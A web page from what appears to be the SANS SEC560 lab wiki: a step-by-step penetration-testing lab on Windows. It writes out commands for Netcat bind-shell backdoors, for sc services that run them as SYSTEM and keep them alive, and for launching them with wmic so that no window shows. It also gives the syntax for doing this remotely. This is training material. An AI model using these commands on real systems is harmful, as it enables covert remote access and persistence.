@@ -1,0 +1,354 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-36-running-commands-with-sc-and-wmic">Lab 3.6: Running Commands with SC and WMIC</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>To use the <code>sc</code> command to create a service out of a Netcat backdoor listener</li>
+<li>To control a backdoor listening service using the <code>sc</code> command</li>
+<li>To set up a port monitoring capability using the Windows <code>netstat</code> command</li>
+<li>To use <code>wmic</code> to create a Netcat backdoor listener</li>
+<li>To analyze how <code>wmic</code> can monitor for processes using its /every:1 syntax</li>
+</ul>
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<p>Let's do a lab with some of the methods we've covered for making a command run on a target Windows machine. In particular, we'll use the <code>sc</code> and <code>wmic</code> techniques. For this lab, we are going to make Windows run a command that invokes a Netcat listener, giving remote, interactive backdoor command shell access with the victim machine. The command that we'll make our own Windows machines run with local SYSTEM privileges is:</p>
+<pre>
+nc.exe -l -p 2222 -e cmd.exe
+</pre>
+
+<p>This command tells Netcat (<code>nc.exe</code>) to run as a listener (<code>-l</code>) on local port (<code>-p</code>) 2222, and when someone connects, it executes (<code>-e</code>) a <code>cmd.exe</code> shell. The attacker then can connect to the machine on TCP port 2222 and get remote interactive command shell access. For this lab, we'll use these techniques locally for practice. But keep in mind that each technique could be used remotely.</p>
+<p>Let's step back and consider what we are trying to learn here. The idea is that, if testers have an admin user ID and password, as well as SMB network access to a target, they can use <code>sc</code> or <code>wmic</code> on the attacker's machine to make the target machine run any command of the attacker's choosing. We are going to use <code>sc</code> and <code>wmic</code> to make the target execute a command shell that we can then access across the network to run various individual commands directly and interactively.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img01.png" style="width:100%;max-width:600px"  alt="Overview of netcat popping a shell" /></p>
+<h4 id="step-1-setup">Step 1: Setup</h4>
+<p>In the <code>C:\Tools</code> directory, there is a file called <code>ncexer.bat</code> that will create two terminal windows for you in different colors for this lab. If you have color vision deficiency, use the titles of the windows as a guide.</p>
+<p>PLEASE RUN THE <code>ncexer.bat</code> FILE WITH ADMIN PRIVILEGES. On Windows, you can do this by right-clicking it and selecting <b>Run as administrator</b>.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img02.png" style="width:100%;max-width:600px"  alt="Right-click ncexer.bat and &quot;Run as administrator&quot;" /></p>
+<p>This file brings up two <code>cmd.exe</code> windows with different colors and titles. The yellow screen will be our Attacker. The grey screen will be our Victim. Now practice invoking a Netcat backdoor listening on TCP port 2222 and giving command shell access. In our Victim (grey) screen, run:</p>
+<p>Victim (grey):</p>
+<pre>
+C:\> <b>C:\Tools\nc.exe -nvlp 2222 -e cmd.exe</b>
+</pre>
+
+<p>Now, in the Attacker (yellow) window, use a Netcat client to connect to that backdoor:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>C:\Tools\nc.exe -nv 127.0.0.1 2222</b>
+</pre>
+
+<p>You should get command shell access. Type in some commands, such as <code>hostname</code> and <code>dir</code>.</p>
+<p>This connection shows the concept of what we are trying to achieve: backdoor shell access of the target Windows machine. But you need to exit this shell to move forward in this lab. <b>Please drop both sides of the connection by pressing <code>CTRL-C</code> in either the yellow or the grey screen. That will close the backdoor so we can move forward and re-create it with the <code>sc</code> command and the <code>wmic</code> command.</b></p>
+<p><img  class="myImg"  src="pics/Ex3.6_img03.png" style="width:100%;max-width:600px"  alt="Note the Attacker and Victim labels in the title bars" /></p>
+<h4 id="step-2-create-a-service">Step 2: Create a service</h4>
+<p>After we've stopped our Netcat listener on TCP port 2222 using CTRL+C, let's use the <code>sc</code> command to make Netcat into a service. In your Attacker window, determine your machine's hostname by running:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>hostname</b>
+Sec560Student
+</pre>
+
+<p>Now use the <code>sc</code> command to create a Netcat service, which we'll name <code>ncservice</code>:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>sc \\Sec560Student create ncservice binpath= "c:\tools\nc.exe -l -p 2222 -e cmd.exe"</b>
+</pre>
+
+<blockquote>
+<p>NOTE THAT THERE MUST BE A SPACE BETWEEN THE EQUALS SIGN AND THE QUOTATION MARK. ALSO, THERE SHOULD BE NO SPACE BETWEEN THE BINPATH AND THE EQUALS SIGN.</p>
+</blockquote>
+<p>Furthermore, don't use an IP address here in place of the hostname (Sec560Student) because some Windows machines have problems with localhost, 127.0.0.1, or local IP addresses as names for this command. Instead, just use your host's name.</p>
+<blockquote>
+<p>We are using the hostname here to simulate running commands on a remote computer. We could do this with one of the lab machines, but there would be a lot of port and service name conflicts. This makes your life easier and it accomplishes the exact same thing.</p>
+</blockquote>
+<p>Remotely, this command works well with just the IP address of the victim machine. If the service was created successfully, your machine should state <b>Create Service SUCCESS</b>.</p>
+<p>You can then query the service state using this command:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>sc \\Sec560Student query ncservice</b>
+</pre>
+
+<p>You should see that the service STATE is STOPPED.</p>
+<p>Next, we'll start it and try to connect to it.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img04.png" style="width:100%;max-width:600px"  alt="ncservice is stopped on creation" /></p>
+<p>Now that we've created our <code>ncservice</code>, let's set up a little monitor for the service in our Victim window. You can do this by monitoring for TCP port 2222 to start listening. Run the <code>netstat</code> command, as follows:</p>
+<p>Victim (grey):</p>
+<pre>
+C:\> <b>netstat -nao 1 | find ":2222"</b>
+</pre>
+
+<p>This command tells <code>netstat</code> to list, in numerical form (<code>-n</code>), all the TCP and UDP ports (<code>-a</code>) in use and the process ID number using each port (<code>-o</code>), running every one second (&mldr; and there must be a space between the <code>-nao</code> and the <code>1</code>). We then scrape the output of <code>netstat</code> to look for the string 2222, which would indicate that the port is in use. The port should not be in use when we run <code>netstat</code> now because we killed our experimental Netcat listener from earlier. If the port is in use right now, kill the associated process with Task Manager or the <code>taskkill</code> command, as follows:</p>
+<pre>
+C:\> <b>taskkill /PID [process_ID]</b>
+</pre>
+
+<p>Now that our monitor is set up in the Victim screen, let's use our attacker screen to start up our service:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>sc \\Sec560Student start ncservice</b>
+</pre>
+
+<p>The service should start, even though the <code>sc</code> command doesn't return immediately.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img05.png" style="width:100%;max-width:600px"  alt="Start ncservice remotely with sc" /></p>
+<p>In your Victim (grey) window, your netstat command should begin displaying output, indicating that TCP port 2222 is LISTENING. Unfortunately, after approximately 30 seconds, the <code>sc</code> command finishes, displaying an error message saying, "The service did not respond to the start or control request in a timely fashion". But we did have a listener for 30 seconds.</p>
+<p>You may see that it appears that your port is still open and listening even after Windows kills the service. That&rsquo;s a phantom port listener. The Process ID indicated by netstat&rsquo;s output is likely no longer running on Windows, so no one can connect to that port, even though netstat&rsquo;s output still shows <code>LISTENING</code>. After a few seconds, Windows realizes this and frees up the port.</p>
+<p>Stop your <code>netstat</code> command by pressing <code>CTRL-C</code> in the Victim (grey) window.</p>
+<p>Then delete the original <code>ncservice</code> so that we can replace it with one that is more persistent, listening beyond the 30-second timeout:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>sc \\Sec560Student delete ncservice</b>
+</pre>
+
+<h4 id="step-3-a-better-service">Step 3: A better service</h4>
+<p>Restart your <code>netstat</code> command in the Victim window to monitor for our listener:</p>
+<p>Victim (grey):</p>
+<pre>
+C:\> <b>netstat -nao 1 | find ":2222"</b>
+</pre>
+
+<p>Create a better Netcat service, called <code>ncservice2</code>, which makes a Netcat listener that survives for more than 30 seconds by invoking a <code>cmd.exe</code> as a service that, in turn, runs Netcat using the <code>/k</code> option:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>sc \\Sec560Student create ncservice2 binpath= "cmd.exe /k c:\tools\nc.exe -l -p 2222 -e cmd.exe"</b>
+</pre>
+
+<p>Finally, start that service:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>sc \\Sec560Student start ncservice2</b>
+</pre>
+
+<p>Again, your <code>sc</code> command will hang and then fail with the same error message as before. But now the listener should keep listening, with port 2222 staying open. Your Victim (grey) window should keep on displaying lines saying that the port is listening.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img06.png" style="width:100%;max-width:600px"  alt="Better ncservice. Better results." /></p>
+<p>Now, in the Attacker (yellow) window, connect to the listener using a Netcat client:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>c:\tools\nc.exe 127.0.0.1 2222</b>
+</pre>
+
+<p>You should get a command shell back. This command shell is generated by the Netcat process running in the background with local SYSTEM privileges, created by the <code>ncservice2</code> service that we created. Remember to note that the title bar of the Attacker (yellow) window shows a Netcat client invocation (<code>c:\tools\nc.exe 127.0.0.1 2222</code>), so the command prompt you see in this window is coming from whatever this Netcat client is connected to, namely our Netcat listener running in the background.</p>
+<p>Type commands, such as <code>hostname</code>, <code>whoami</code>, and <code>dir</code>, into this Netcat client. We've gotten remote interactive command shell access as local SYSTEM using the <code>sc</code> command. Also, note that the status of TCP port 2222 in our Victim (grey) screen is <b>ESTABLISHED</b>.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img07.png" style="width:100%;max-width:600px"  alt="The Attacker has successfully popped a shell on the Victim" /></p>
+<p>Note that if you press <code>CTRL-C</code> in your Netcat client, it drops the connection, also causing the Netcat listener to stop as well. That's because we invoked the Netcat listener with the <code>-l</code> option, which creates a listener that listens for one connection and then stops running when that connection goes away. If we had invoked it with a <code>-L</code>, the Windows version of Netcat would listen harder, creating a persistent listener that allows multiple connections serially, one after the other. With <code>-L</code>, Netcat keeps listening between connections. In penetration testing, sometimes we want a listener to run for one connection (<code>-l</code>), and sometimes we want a persistent listener (<code>-L</code>). The Windows version of Netcat gives us an option to choose either.</p>
+<p>To finish with this part of the lab, make sure you kill your Netcat client by pressing <code>CTRL-C</code> in the Attacker (yellow) window. Also, stop your <code>netstat</code> command by pressing <code>CTRL-C</code> in the Victim (grey) window.</p>
+<p>And remember to delete your <code>ncservice2</code> with this command:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>sc \\Sec560Student delete ncservice2</b>
+</pre>
+
+<p>Verify that port 2222 is no longer in use by running:</p>
+<p>Victim (grey):</p>
+<pre>
+C:\> <b>netstat -nao | find ":2222"</b>
+</pre>
+
+<p>Note that we did not use a <code>1</code> here to run <code>netstat</code> every second. We want it to run just once to verify that the port isn't in use anymore.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img08.png" style="width:100%;max-width:600px"  alt="Add a number one to the netstat command to query every second" /></p>
+<h4 id="step-4-wmic">Step 4: WMIC</h4>
+<p>Next, we will launch a Netcat listener with <code>wmic</code> instead of <code>sc</code>. As you'll see, this is easier to do with <code>wmic</code> and has a smaller footprint on the target machine. (That is, we don't have to define a service that we later delete.) However, the process that we invoke won't have local SYSTEM privileges. Instead, the process will run with administrator privileges.</p>
+<p>Start by running a monitor in our Victim (grey) window. We could use a monitor that looks for a given port with <code>netstat</code>, as before. But instead, to be different and expand our skills, let's use a <code>wmic</code> command to monitor for the start of a process called <code>nc.exe</code>. We can do this with the following command:</p>
+<p>Victim (grey):</p>
+<pre>
+C:\> <b>wmic process where name="nc.exe" list brief /every:1</b>
+</pre>
+
+<p>This command invokes <code>wmic</code> to look at processes that have a name of <code>nc.exe</code>, listing one line of output (brief) with important information for each process with that name. With the <code>/every:1</code> syntax, we can use <code>wmic</code> to run any command that reads information from our machine every second. Because there is no process called <code>nc.exe</code> on our machines, the system says, <b>No instance(s) Available.</b> If you do see a Netcat executable, kill it using the <code>taskkill</code> command.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img09.png" style="width:100%;max-width:600px"  alt="Check to make sure Netcat is not running" /></p>
+<p>Although the <code>wmic</code> command continues to run every second, move to the Attacker (yellow) window. Let's use <code>wmic</code> to invoke a Netcat listener on the target machine, as follows:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>wmic process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"</b>
+</pre>
+
+<p>By default, <code>wmic</code> takes action on the local machine. To make this work remotely, we'd have to add the syntax <code>/node:Sec560Student /user:[AdminUser] /password: [password]</code> after <code>wmic</code> and before <code>process</code> in this command. Just run it locally for now.</p>
+<p>Then look at the output of your victim window. Do you see the Netcat process running in the output of the <code>wmic /every:1</code> command?</p>
+<p>In your attacker window, connect to the Netcat listener using:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>c:\tools\nc.exe 127.0.0.1 4444</b>
+</pre>
+
+<p>Type in some commands, such as <code>hostname</code>, <code>whoami</code>, <code>ipconfig</code>, and <code>dir</code>. You&rsquo;ll see that your privileges are of the admin user who ran <code>wmic</code>. When you finish, press <code>CTRL-C</code> in both your Attacker (yellow) and Victim (grey) windows to stop the Netcat client (which will also kill the <code>-l</code> Netcat listener) and the <code>wmic</code> monitoring loop.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img10.png" style="width:100%;max-width:600px"  alt="Kill both the Attacker and Victim Netcat instances when done" /></p>
+<p>Did you notice a console window that popped up when you invoked Netcat using <code>wmic</code>? It likely had a blank screen with a title of <code>c:\tools\nc.exe</code>.</p>
+<p><img  class="myImg"  src="pics/Ex3.6_img11.png" style="width:100%;max-width:600px"  alt="Be careful of pop-ups that might alert the Victim" /></p>
+<p>This console is a side effect of the way we invoked Netcat. If Netcat is invoked in a way that can interact with the user's desktop console session, it pops up a console window, unless we invoke Netcat with the <code>-d</code> option. The <code>-d</code> option tells Netcat to run detached from the current user's session. As a penetration tester, we often want to avoid console windows appearing on the screens of our target machines as we are testing them, so it's often safest to invoke Netcat with <code>-d</code> on Windows. The Linux and UNIX versions of Netcat do not have this side effect. In fact, there is no <code>-d</code> option in Netcat for Linux/UNIX.</p>
+<p>Try to invoke Netcat using <code>wmic</code> as before, but this time with the <code>-d</code> option:</p>
+<p>Attacker (yellow):</p>
+<pre>
+C:\> <b>wmic process call create "c:\tools\nc.exe -dlp 4444 -e cmd.exe"</b>
+</pre>
+
+<p>Now you should not see the console window. (Actually, it might flash on the screen quickly and then disappear, depending on your system's performance.)</p>
+<p>To finish with the lab, kill all remaining Netcat processes with this command:</p>
+<pre>
+C:\> <b>wmic process where name="nc.exe" delete</b>
+</pre>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>In conclusion, in this lab, you&rsquo;ve seen how to cause target Windows machines to run commands of your choosing. The two techniques covered, using <code>sc</code> to create and run a service (thereby emulating <code>psexec</code> but using only built-in tools) and running <code>wmic</code> to cause a target to start a process, are particularly useful for penetration testers because of their application of built-in Windows features. At the end of this lab, make sure you kill your Netcat listeners, as well as remove the <code>ncservice</code> and <code>ncservice2</code> you created during the lab.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
